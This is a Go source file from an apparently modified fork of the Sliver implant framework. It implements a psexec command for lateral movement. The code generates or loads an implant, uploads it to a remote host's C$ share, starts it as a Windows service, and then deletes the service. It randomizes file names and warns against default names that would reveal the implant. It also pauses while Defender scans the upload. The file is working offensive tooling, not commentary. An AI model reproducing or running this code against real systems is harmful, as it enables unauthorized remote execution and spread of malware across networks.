package exec

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	insecureRand "math/rand"

	"github.com/B0lg0r0v/sliver_modified/client/command/generate"
	"github.com/B0lg0r0v/sliver_modified/client/command/settings"
	"github.com/B0lg0r0v/sliver_modified/client/console"
	"github.com/B0lg0r0v/sliver_modified/protobuf/clientpb"
	"github.com/B0lg0r0v/sliver_modified/protobuf/commonpb"
	"github.com/B0lg0r0v/sliver_modified/protobuf/sliverpb"
	"github.com/B0lg0r0v/sliver_modified/server/codenames"
	"github.com/B0lg0r0v/sliver_modified/util/encoders"
	"github.com/desertbit/grumble"
)

// PsExecCmd - psexec command implementation.
func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	hostname := ctx.Args.String("hostname")
	if hostname == "" {
		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
		return
	}
	var serviceBinary []byte
	profile := ctx.Flags.String("profile")
	serviceName := ctx.Flags.String("service-name")
	serviceDesc := ctx.Flags.String("service-description")
	binPath := ctx.Flags.String("binpath")
	customExe := ctx.Flags.String("custom-exe")
	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))

	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
		con.PrintWarnf("You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
		con.PrintWarnf("You might want to change that before going further...\n")
		if !settings.IsUserAnAdult(con) {
			return
		}
	}

	if customExe == "" {
		if profile == "" {
			con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
			return
		}

		// generate sliver
		generateCtrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
		profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
		if err != nil {
			con.PrintErrorf("Error: %s\n", err)
			return
		}
		generateCtrl <- true
		<-generateCtrl
		var implantProfile *clientpb.ImplantProfile
		for _, prof := range profiles.Profiles {
			if prof.Name == profile {
				implantProfile = prof
			}
		}
		if implantProfile.GetName() == "" {
			con.PrintErrorf("No profile found for name %s\n", profile)
			return
		}
		serviceBinary, _ = generate.GetSliverBinary(implantProfile, con)
	} else {
		// use a custom exe instead of generating a new Sliver
		fileBytes, err := os.ReadFile(customExe)
		if err != nil {
			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
			return
		}
		serviceBinary = fileBytes
	}

	filename := randomFileName()
	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
	uploadGzip := new(encoders.Gzip).Encode(serviceBinary)
	// upload to remote target
	uploadCtrl := make(chan bool)
	con.SpinUntil("Uploading service binary ...", uploadCtrl)
	upload, err := con.Rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
		Request: con.ActiveTarget.Request(ctx),
	})
	uploadCtrl <- true
	<-uploadCtrl
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}
	con.PrintInfof("Uploaded service binary to %s\n", upload.GetPath())
	con.PrintInfof("Waiting a bit for the file to be analyzed ...\n")
	// Looks like starting the service right away often fails
	// because a process is already using the binary.
	// I suspect that Defender on my lab is holding access
	// while scanning, which often resulted in an error.
	// Waiting 5 seconds seem to do the trick here.
	time.Sleep(5 * time.Second)
	// start service
	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
	serviceCtrl := make(chan bool)
	con.SpinUntil("Starting service ...", serviceCtrl)
	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            con.ActiveTarget.Request(ctx),
		ServiceDescription: serviceDesc,
		ServiceName:        serviceName,
		Arguments:          "",
	})
	serviceCtrl <- true
	<-serviceCtrl
	if err != nil {
		con.PrintErrorf("Error: %v\n", err)
		return
	}
	if start.Response != nil && start.Response.Err != "" {
		con.PrintErrorf("Error: %s", start.Response.Err)
		return
	}
	con.PrintInfof("Successfully started service on %s (%s)\n", hostname, binaryPath)
	removeChan := make(chan bool)
	con.SpinUntil("Removing service ...", removeChan)
	removed, err := con.Rpc.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: con.ActiveTarget.Request(ctx),
	})
	removeChan <- true
	<-removeChan
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}
	if removed.Response != nil && removed.Response.Err != "" {
		con.PrintErrorf("Error: %s\n", removed.Response.Err)
		return
	}
	con.PrintInfof("Successfully removed service %s on %s\n", serviceName, hostname)
}

func randomFileName() string {
	noun, _ := codenames.RandomNoun()
	noun = strings.ToLower(noun)
	switch insecureRand.Intn(3) {
	case 0:
		noun = strings.ToUpper(noun)
	case 1:
		noun = strings.ToTitle(noun)
	}

	separators := []string{"", "", "", "", "", ".", "-", "_", "--", "__"}
	sep := separators[insecureRand.Intn(len(separators))]

	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
	prefix := ""
	for index := 0; index < insecureRand.Intn(3); index++ {
		prefix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
	}
	suffix := ""
	for index := 0; index < insecureRand.Intn(6)+1; index++ {
		suffix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
	}

	return fmt.Sprintf("%s%s%s%s%s", prefix, sep, noun, sep, suffix)
}